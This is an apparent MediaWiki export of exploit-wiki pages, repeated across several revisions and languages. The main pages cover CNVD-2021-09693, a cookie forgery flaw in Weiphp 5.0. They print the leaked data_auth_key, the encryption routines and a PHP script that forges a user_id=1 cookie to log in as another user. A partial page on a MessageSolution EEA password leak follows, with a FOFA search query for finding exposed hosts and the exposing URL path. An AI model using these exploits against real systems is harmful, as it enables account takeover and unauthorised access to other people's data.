    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:8--&gt;
解密方法 &lt;code&gt;think_decrypt&lt;/code&gt;
&lt;/translate&gt;

&lt;pre&gt;
function think_decrypt($data, $key = '')
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);
    $data = str_replace(array(
        '-',
        '_'
    ), array(
        '+',
        '/'
    ), $data);
    $mod4 = strlen($data) % 4;
    if ($mod4) {
        $data .= substr('====', $mod4);
    }
    $data = base64_decode($data);
    $expire = substr($data, 0, 10);
    $data = substr($data, 10);

    if ($expire &gt; 0 &amp;&amp; $expire &lt; time()) {
        return '';
    }
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = $str = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    for ($i = 0; $i &lt; $len; $i++) {
        if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return base64_decode($str);
}
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:9--&gt;
在文件 &lt;code&gt;application\common.php&lt;/code&gt; 中含有使用解密方法的代碼，用於做身份驗證
&lt;/translate&gt;

&lt;pre&gt;
function is_login()
{
    $user = session('user_auth');
    if (empty($user)) {
        $cookie_uid = cookie('user_id');
        if (!empty($cookie_uid)) {
            $uid = think_decrypt($cookie_uid);
            $userinfo = getUserInfo($uid);
            D('common/User')-&gt;autoLogin($userinfo);

            $user = session('user_auth');
        }
    }
    if (empty($user)) {
        return 0;
    } else {
        return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
    }
}
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:10--&gt;
根據這裡得到的代碼，可以知道當user_Id=1時,會解密密鑰後判斷是否正確，如果正確則可以登錄系統

&lt;!--T:11--&gt;
我們在本地使用加密代碼加密user_id=1得到的cookie則可以登錄系統
&lt;/translate&gt;

&lt;pre&gt;
&lt;?php
show_source(__FILE__);
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T';
    $key = md5($key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}

echo 'user_id = ' . think_encrypt($_GET['user_id']);
?&gt;
&lt;/pre&gt;


&lt;translate&gt;
&lt;!--T:12--&gt;
添加&lt;code&gt;cookie: user_id=xxxxxxxx&lt;/code&gt;即可成功登錄
&lt;/translate&gt;

[[File:Weiphp-18.png |800px]]


&lt;translate&gt;
==參考== &lt;!--T:13--&gt;
&lt;/translate&gt;
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.html</text>
      <sha1>ini1ou4zt7q8q33abcyfy9l8c9jmc7b</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-09693 Weiphp5.0 任意用戶Cookie偽造漏洞/en</title>
    <ns>0</ns>
    <id>3943</id>
    <revision>
      <id>4560</id>
      <timestamp>2021-06-10T02:48:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Found the encryption method and decryption method based on this key"</comment>
      <origin>4560</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4656" sha1="qfrma4uwntjc0o8j87v2fona6w1lkw0" xml:space="preserve">&lt;languages  /&gt;

==Vulnerability Impact==
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;


==Exploit==

First, you need to get the &lt;code&gt;data_auth_key&lt;/code&gt; key in the database configuration file

[[File:Weiphp-15.png |800px]]

To get this configuration file, please refer to [https://www.pwnwiki.org/index.php?title=CNVD-2020-68596_Weiphp5.0_%E5%89%8D%E5%8F%B0%E6%96%87%E4 %BB%B6%E4%BB%BB%E6%84%8F%E8%AE%80%E5%8F%96%E6%BC%8F%E6%B4%9E CNVD-2020-68596 Weiphp5.0 front file Arbitrary read vulnerability]


&lt;pre&gt;
'data_auth_key' =&gt; '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T'
&lt;/pre&gt;


Find the place where this key is used globally:

[[File:Weiphp-16.png |800px]]


Found the encryption method and decryption method based on this key


Encryption method &lt;code&gt;think_encrypt&lt;/code&gt;

&lt;pre&gt;

function think_encrypt($data, $key = '', $expire = 0)
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}
&lt;/pre&gt;

Decryption method &lt;code&gt;think_decrypt&lt;/code&gt;

&lt;pre&gt;
function think_decrypt($data, $key = '')
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);
    $data = str_replace(array(
        '-',
        '_'
    ), array(
        '+',
        '/'
    ), $data);
    $mod4 = strlen($data) % 4;
    if ($mod4) {
        $data .= substr('====', $mod4);
    }
    $data = base64_decode($data);
    $expire = substr($data, 0, 10);
    $data = substr($data, 10);

    if ($expire &gt; 0 &amp;&amp; $expire &lt; time()) {
        return '';
    }
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = $str = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    for ($i = 0; $i &lt; $len; $i++) {
        if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return base64_decode($str);
}
&lt;/pre&gt;

The file &lt;code&gt;application\common.php&lt;/code&gt; contains the code to use the decryption method for authentication

&lt;pre&gt;
function is_login()
{
    $user = session('user_auth');
    if (empty($user)) {
        $cookie_uid = cookie('user_id');
        if (!empty($cookie_uid)) {
            $uid = think_decrypt($cookie_uid);
            $userinfo = getUserInfo($uid);
            D('common/User')-&gt;autoLogin($userinfo);

            $user = session('user_auth');
        }
    }
    if (empty($user)) {
        return 0;
    } else {
        return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
    }
}
&lt;/pre&gt;

According to the code obtained here, you can know that when user_Id=1, the key will be decrypted to determine whether it is correct, and if it is correct, you can log in to the system

We can log in to the system by encrypting the cookie obtained with user_id=1 with an encryption code locally

&lt;pre&gt;
&lt;?php
show_source(__FILE__);
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T';
    $key = md5($key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}

echo 'user_id = ' . think_encrypt($_GET['user_id']);
?&gt;
&lt;/pre&gt;


Add &lt;code&gt;cookie: user_id=xxxxxxxx&lt;/code&gt; to log in successfully

[[File:Weiphp-18.png |800px]]


==Reference==
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.html</text>
      <sha1>qfrma4uwntjc0o8j87v2fona6w1lkw0</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-09693 Weiphp5.0 任意用戶Cookie偽造漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3160</id>
    <revision>
      <id>3667</id>
      <timestamp>2021-05-30T13:14:52Z</timestamp>
      <contributor>
        <username>Evi1f4iry</username>
        <id>107</id>
      </contributor>
      <comment>Created page with "得到这个配置文件可参考[https://www.pwnwiki.org/index.php?title=CNVD-2020-68596_Weiphp5.0_%E5%89%8D%E5%8F%B0%E6%96%87%E4 %BB%B6%E4%BB%BB%E6%84%8F%E8%AE%80%E5%8F%96%E..."</comment>
      <origin>3667</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4869" sha1="9xycsbpj93e1yv1f7qggwasaigjd0xz" xml:space="preserve">&lt;languages  /&gt;

==漏洞影响==
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;


==漏洞利用==

首先需要得到数据库配置文件中的&lt;code&gt;data_auth_key&lt;/code&gt;密钥

[[File:Weiphp-15.png |800px]]

得到这个配置文件可参考[https://www.pwnwiki.org/index.php?title=CNVD-2020-68596_Weiphp5.0_%E5%89%8D%E5%8F%B0%E6%96%87%E4 %BB%B6%E4%BB%BB%E6%84%8F%E8%AE%80%E5%8F%96%E6%BC%8F%E6%B4%9E CNVD-2020-68596 Weiphp5.0 前台文件任意读取漏洞]


&lt;pre&gt;
'data_auth_key' =&gt; '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T'
&lt;/pre&gt;


全局查找使用了这个密钥的地方:

[[File:Weiphp-16.png |800px]]


找到了跟据这个密钥的加密方法和解密方法


加密方法 &lt;code&gt;think_encrypt&lt;/code&gt;

&lt;pre&gt;

function think_encrypt($data, $key = '', $expire = 0)
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
解密方法 &lt;code&gt;think_decrypt&lt;/code&gt;
&lt;/div&gt;

&lt;pre&gt;
function think_decrypt($data, $key = '')
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);
    $data = str_replace(array(
        '-',
        '_'
    ), array(
        '+',
        '/'
    ), $data);
    $mod4 = strlen($data) % 4;
    if ($mod4) {
        $data .= substr('====', $mod4);
    }
    $data = base64_decode($data);
    $expire = substr($data, 0, 10);
    $data = substr($data, 10);

    if ($expire &gt; 0 &amp;&amp; $expire &lt; time()) {
        return '';
    }
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = $str = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    for ($i = 0; $i &lt; $len; $i++) {
        if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return base64_decode($str);
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
在文件 &lt;code&gt;application\common.php&lt;/code&gt; 中含有使用解密方法的代碼，用於做身份驗證
&lt;/div&gt;

&lt;pre&gt;
function is_login()
{
    $user = session('user_auth');
    if (empty($user)) {
        $cookie_uid = cookie('user_id');
        if (!empty($cookie_uid)) {
            $uid = think_decrypt($cookie_uid);
            $userinfo = getUserInfo($uid);
            D('common/User')-&gt;autoLogin($userinfo);

            $user = session('user_auth');
        }
    }
    if (empty($user)) {
        return 0;
    } else {
        return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
    }
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
根據這裡得到的代碼，可以知道當user_Id=1時,會解密密鑰後判斷是否正確，如果正確則可以登錄系統
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
我們在本地使用加密代碼加密user_id=1得到的cookie則可以登錄系統
&lt;/div&gt;

&lt;pre&gt;
&lt;?php
show_source(__FILE__);
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T';
    $key = md5($key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}

echo 'user_id = ' . think_encrypt($_GET['user_id']);
?&gt;
&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
添加&lt;code&gt;cookie: user_id=xxxxxxxx&lt;/code&gt;即可成功登錄
&lt;/div&gt;

[[File:Weiphp-18.png |800px]]


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.html</text>
      <sha1>9xycsbpj93e1yv1f7qggwasaigjd0xz</sha1>
    </revision>
    <revision>
      <id>3675</id>
      <parentid>3667</parentid>
      <timestamp>2021-05-30T13:16:58Z</timestamp>
      <contributor>
        <username>Evi1f4iry</username>
        <id>107</id>
      </contributor>
      <comment>Created page with "==漏洞利用=="</comment>
      <origin>3675</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4503" sha1="9rx8181u84giyn6waoqgrq8hpooqz3a" xml:space="preserve">&lt;languages  /&gt;

==漏洞影响==
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;


==漏洞利用==

首先需要得到数据库配置文件中的&lt;code&gt;data_auth_key&lt;/code&gt;密钥

[[File:Weiphp-15.png |800px]]

得到这个配置文件可参考[https://www.pwnwiki.org/index.php?title=CNVD-2020-68596_Weiphp5.0_%E5%89%8D%E5%8F%B0%E6%96%87%E4 %BB%B6%E4%BB%BB%E6%84%8F%E8%AE%80%E5%8F%96%E6%BC%8F%E6%B4%9E CNVD-2020-68596 Weiphp5.0 前台文件任意读取漏洞]


&lt;pre&gt;
'data_auth_key' =&gt; '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T'
&lt;/pre&gt;


全局查找使用了这个密钥的地方:

[[File:Weiphp-16.png |800px]]


找到了跟据这个密钥的加密方法和解密方法


加密方法 &lt;code&gt;think_encrypt&lt;/code&gt;

&lt;pre&gt;

function think_encrypt($data, $key = '', $expire = 0)
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}
&lt;/pre&gt;

解密方法 &lt;code&gt;think_decrypt&lt;/code&gt;

&lt;pre&gt;
function think_decrypt($data, $key = '')
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);
    $data = str_replace(array(
        '-',
        '_'
    ), array(
        '+',
        '/'
    ), $data);
    $mod4 = strlen($data) % 4;
    if ($mod4) {
        $data .= substr('====', $mod4);
    }
    $data = base64_decode($data);
    $expire = substr($data, 0, 10);
    $data = substr($data, 10);

    if ($expire &gt; 0 &amp;&amp; $expire &lt; time()) {
        return '';
    }
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = $str = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    for ($i = 0; $i &lt; $len; $i++) {
        if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return base64_decode($str);
}
&lt;/pre&gt;

在文件 &lt;code&gt;application\common.php&lt;/code&gt; 中含有使用解密方法的代码，用于做身份验证

&lt;pre&gt;
function is_login()
{
    $user = session('user_auth');
    if (empty($user)) {
        $cookie_uid = cookie('user_id');
        if (!empty($cookie_uid)) {
            $uid = think_decrypt($cookie_uid);
            $userinfo = getUserInfo($uid);
            D('common/User')-&gt;autoLogin($userinfo);

            $user = session('user_auth');
        }
    }
    if (empty($user)) {
        return 0;
    } else {
        return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
    }
}
&lt;/pre&gt;

根据这里得到的代码，可以知道当user_Id=1时,会解密密钥后判断是否正确，如果正确则可以登录系统

我们在本地使用加密代码加密user_id=1得到的cookie则可以登录系统

&lt;pre&gt;
&lt;?php
show_source(__FILE__);
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T';
    $key = md5($key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}

echo 'user_id = ' . think_encrypt($_GET['user_id']);
?&gt;
&lt;/pre&gt;


添加&lt;code&gt;cookie: user_id=xxxxxxxx&lt;/code&gt;即可成功登录

[[File:Weiphp-18.png |800px]]


==参考==
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.html</text>
      <sha1>9rx8181u84giyn6waoqgrq8hpooqz3a</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-09693 Weiphp5.0 任意用戶Cookie偽造漏洞/zh-hant</title>
    <ns>0</ns>
    <id>2960</id>
    <revision>
      <id>3461</id>
      <timestamp>2021-05-26T13:28:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "首先需要得到數據庫配置文件中的&lt;code&gt;data_auth_key&lt;/code&gt;密鑰"</comment>
      <origin>3461</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4991" sha1="pqgfp9w13o6f0h3rj2t41jydz4zpjn1" xml:space="preserve">&lt;languages  /&gt;

==漏洞影響==
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;


==漏洞利用==

首先需要得到數據庫配置文件中的&lt;code&gt;data_auth_key&lt;/code&gt;密鑰

[[File:Weiphp-15.png |800px]]

得到這個配置文件可參考 [https://www.pwnwiki.org/index.php?title=CNVD-2020-68596_Weiphp5.0_%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AE%80%E5%8F%96%E6%BC%8F%E6%B4%9E CNVD-2020-68596 Weiphp5.0 前台文件任意讀取漏洞]


&lt;pre&gt;
'data_auth_key' =&gt; '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T'
&lt;/pre&gt;


全局查找使用了這個密鑰的地方:

[[File:Weiphp-16.png |800px]]


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
找到了跟據這個密鑰的加密方法和解密方法
&lt;/div&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
加密方法 &lt;code&gt;think_encrypt&lt;/code&gt;
&lt;/div&gt;

&lt;pre&gt;

function think_encrypt($data, $key = '', $expire = 0)
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
解密方法 &lt;code&gt;think_decrypt&lt;/code&gt;
&lt;/div&gt;

&lt;pre&gt;
function think_decrypt($data, $key = '')
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);
    $data = str_replace(array(
        '-',
        '_'
    ), array(
        '+',
        '/'
    ), $data);
    $mod4 = strlen($data) % 4;
    if ($mod4) {
        $data .= substr('====', $mod4);
    }
    $data = base64_decode($data);
    $expire = substr($data, 0, 10);
    $data = substr($data, 10);

    if ($expire &gt; 0 &amp;&amp; $expire &lt; time()) {
        return '';
    }
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = $str = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    for ($i = 0; $i &lt; $len; $i++) {
        if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return base64_decode($str);
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
在文件 &lt;code&gt;application\common.php&lt;/code&gt; 中含有使用解密方法的代碼，用於做身份驗證
&lt;/div&gt;

&lt;pre&gt;
function is_login()
{
    $user = session('user_auth');
    if (empty($user)) {
        $cookie_uid = cookie('user_id');
        if (!empty($cookie_uid)) {
            $uid = think_decrypt($cookie_uid);
            $userinfo = getUserInfo($uid);
            D('common/User')-&gt;autoLogin($userinfo);

            $user = session('user_auth');
        }
    }
    if (empty($user)) {
        return 0;
    } else {
        return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
    }
}
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
根據這裡得到的代碼，可以知道當user_Id=1時,會解密密鑰後判斷是否正確，如果正確則可以登錄系統
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
我們在本地使用加密代碼加密user_id=1得到的cookie則可以登錄系統
&lt;/div&gt;

&lt;pre&gt;
&lt;?php
show_source(__FILE__);
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T';
    $key = md5($key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i &lt; $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i &lt; $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}

echo 'user_id = ' . think_encrypt($_GET['user_id']);
?&gt;
&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
添加&lt;code&gt;cookie: user_id=xxxxxxxx&lt;/code&gt;即可成功登錄
&lt;/div&gt;

[[File:Weiphp-18.png |800px]]


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.html</text>
      <sha1>pqgfp9w13o6f0h3rj2t41jydz4zpjn1</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-10543 MessageSolution 郵件歸檔系統EEA 信息洩露漏洞</title>
    <ns>0</ns>
    <id>386</id>
    <revision>
      <id>568</id>
      <timestamp>2021-03-22T07:10:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==漏洞影響==  MessageSolution 企業郵件歸檔管理系統EEA  &lt;/translate&gt;  ==FOFA== &lt;pre&gt; title="MessageSolution Enterprise Email Archiving..."</comment>
      <origin>568</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="553" sha1="dwveler61ol3y1y0ac0bq7wpgtivck7" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響==

MessageSolution 企業郵件歸檔管理系統EEA

&lt;/translate&gt;

==FOFA==
&lt;pre&gt;
title="MessageSolution Enterprise Email Archiving (EEA)"
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
訪問如下Url
&lt;/translate&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/authenticationserverservlet/
&lt;/pre&gt;

[[File:Xnip2021-03-22_15-06-00.jpg | 500px]]

&lt;translate&gt;
使用獲得到的密碼可以登錄系統
&lt;/translate&gt;

[[File:Xnip2021-03-22_15-09-59.jpg | 500px]]

==POC==
https://github.com/Henry4E36/CNVD-2021-10543</text>
      <sha1>dwveler61ol3y1y0ac0bq7wpgtivck7</sha1>
    </revision>
    <revision>
      <id>569</id>
      <parentid>568</parentid>
      <timestamp>2021-03-22T07:11:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>569</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="608" sha1="o1g8i5kliny917gq9knhatyvpbj9fb3" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;

&lt;!--T:2--&gt;
MessageSolution 企業郵件歸檔管理系統EEA

&lt;/translate&gt;

==FOFA==
&lt;pre&gt;
title="MessageSolution Enterprise Email Archiving (EEA)"
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:3--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:4--&gt;
訪問如下Url
